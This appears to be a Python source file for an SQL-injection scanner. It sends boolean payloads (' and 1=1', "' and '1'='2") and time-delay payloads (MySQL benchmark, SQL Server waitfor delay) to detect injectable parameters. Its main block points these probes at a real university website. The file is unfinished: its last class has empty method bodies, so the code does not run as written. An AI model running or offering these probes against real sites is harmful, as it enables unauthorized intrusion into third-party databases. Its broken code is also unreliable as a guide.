'''
Created on 2012-8-13

@author: zsy
'''
from urllib.parse import quote
from urllib.parse import urlencode
from urllib.request import Request
from urllib.request import urlopen
import time
class heuristicTest:
    def heutest(self,dict,item):
        dict[item]=str()
class judgeInjectType():
    def requestdict(self,dict):
            dict=urlencode(dict)
            link=self.url+"?"+dict
            r=Request(link)
            resp=urlopen(r)
            if resp:
                code=resp.getcode()
                headresp=resp.info()
                urlresp=resp.geturl()
                pageresp=resp.read()
                return code,headresp,urlresp,pageresp
            else:
                return None
    def judgetype(self,dict,item):#judge Injectiontype of a parameter:num/char/null
        code,headresp,urlresp,pageresp=self.requestdict(dict)
        modifieddict=dict
#        modifieddict[item]=str(dict[item])
        dict[item]=str(dict[item])
        modifieddict[item]=dict[item]+" and 1=1"
        code1,headresp1,urlresp1,pageresp1=self.requestdict(modifieddict)
        modifieddict[item]=dict[item]+" and 1=2"
        code2,headresp2,urlresp2,pageresp2=self.requestdict(modifieddict)
        modifieddict[item]=dict[item]+"' and '1'='1"
        code3,headresp3,urlresp3,pageresp3=self.requestdict(modifieddict)
        modifieddict[item]=dict[item]+"' and '1'='2"
        code4,headresp4,urlresp4,pageresp4=self.requestdict(modifieddict)
        if len(pageresp)==len(pageresp1) and len(pageresp)!=len(pageresp2):
                    print("numeric injection point:",item)
                    injecttpye="num"
                    return injecttpye
        elif len(pageresp)==len(pageresp3) and len(pageresp)!=len(pageresp4):
                    print("char injection point:",item)
                    injecttpye="char"
                    return injecttpye
        else:
            return None
    def StrInlineInjection(self,dict,item):
        code,headresp,urlresp,pageresp=self.requestdict(dict)
        modifieddict=dict
        dict[item]=str(dict[item])
        modifieddict[item]=dict[item]+"'"
        code,headresp,urlresp,pageresp=self.requestdict(modifieddict)
        
        
class TimeDetect():
    def __init__(self,dict):
        self.dict=dict
        self.url=list(self.dict)[0]
        self.paradict=self.dict[self.url]
#        self.dict=urlencode(self.paradict)
#        self.link=self.url+"?"+self.dict
#        self.link="http://fist.xjtu.edu.cn//newslist.php?ChannelID=&ClassIDOne=20"
#        self.link1="http://fist.xjtu.edu.cn//newslist.php?ChannelID=&ClassIDOne=20"+quote("; SELECT benchmark( 1000000000, md5('dsag'))")
        '''
    def requestlink(self,link):
        r=Request(link)
        time1=time.time()
        resp=urlopen(r)
        print(resp.getcode())
        time2=time.time()
        timeresp=time2-time1
        return timeresp
        '''
    def requestdict(self,dict):
        dict=urlencode(dict)
        link=self.url+"?"+dict
        r=Request(link)
        time1=time.time()
        resp=urlopen(link)
        time2=time.time()
        timeresp=time2-time1
        return timeresp
    def MysqlDet(self):      
        modifieddict=self.paradict
        modifieddict[list(self.paradict)[-1]]=str(modifieddict[list(self.paradict)[-1]])
        modifieddict[list(self.paradict)[-1]]+=";SELECT benchmark( 1000000000, 'dsag' )"
        timeinject=self.requestdict(modifieddict)
#        link=self.link+quote(";SELECT SLEEP(5) AS 1;-- ")sleep() only after v5.0.12 has
#        link=self.link+quote("UNION SELECT SLEEP(5) AS 1;-- ")#can't use union because latter cols' num should be the same with the former's
#        link=self.link+quote("; SELECT benchmark( 1000000000, 'dsag' ) ")
#        timeresp=self.requestlink(self.link1)
        timenormal=self.requestdict(self.paradict)
        if timeinject-timenormal>0:
            print("MySQL Injection\n","\n delay ",timeinject-timenormal)
    def SqlSerDet(self):
        modifieddict=self.paradict
        modifieddict[list(self.paradict)[-1]]=str(modifieddict[list(self.paradict)[-1]])
        modifieddict[list(self.paradict)[-1]]+=";waitfor delay '0:0:5';--"
        timeinject=self.requestdict(modifieddict)
        timenormal=self.requestdict(self.paradict)
        if timeinject-timenormal>5:
            print("SQL Server Injection\n","\n delay ",timeinject-timenormal)
if __name__=="__main__":
#    dict={"http://fist.xjtu.edu.cn//student.php":{"aid":171}}
    dict={"http://fist.xjtu.edu.cn//newslist.php":{"ChannelID":None,"ClassIDOne":20}}
    timedet=TimeDetect(dict)
    timedet.MysqlDet()
    timedet.SqlSerDet()

      
class SplitBalance():
    def __init__(self,dict):
        self.dict=dict
        self.url=list(self.dict)[0]
        self.paradict=self.dict[self.url]
    def numericSB(self):
        
    def characterSB(self):
    def dateSB(self):
    